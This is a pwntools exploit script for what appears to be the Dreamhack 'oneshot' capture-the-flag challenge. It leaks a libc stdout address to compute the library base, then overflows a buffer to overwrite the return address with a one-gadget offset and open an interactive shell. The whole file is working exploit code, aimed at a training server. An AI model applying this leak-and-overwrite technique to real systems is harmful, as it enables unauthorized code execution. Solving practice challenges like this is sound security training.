from pwn import *
context.log_level='debug'

host = 'host1.dreamhack.games'
port = 18852

p = remote(host,port)

elf = ELF('./oneshot')
libc = ELF('./libc.so.6')

one_shot_offset = 0x45216
stdout_offset = libc.symbols['_IO_2_1_stdout_']
#stdout_offset = 0x3c5620

p.recvuntil('stdout: ')
recv_stdout = p.recvline()[:-1]
recv_stdout = int(recv_stdout,16)
base_libc = recv_stdout-stdout_offset
one_shot = base_libc+one_shot_offset
log.info('base_libc : '+str(hex(base_libc)))
log.info('one_shot : '+str(hex(one_shot)))

payload = b'\x90'*24
payload += b'\x00'*8
payload += b'\x90'*8
payload += p64(one_shot)

log.info('payload : '+str(payload))
p.sendlineafter('MSG: ',payload)


p.interactive()
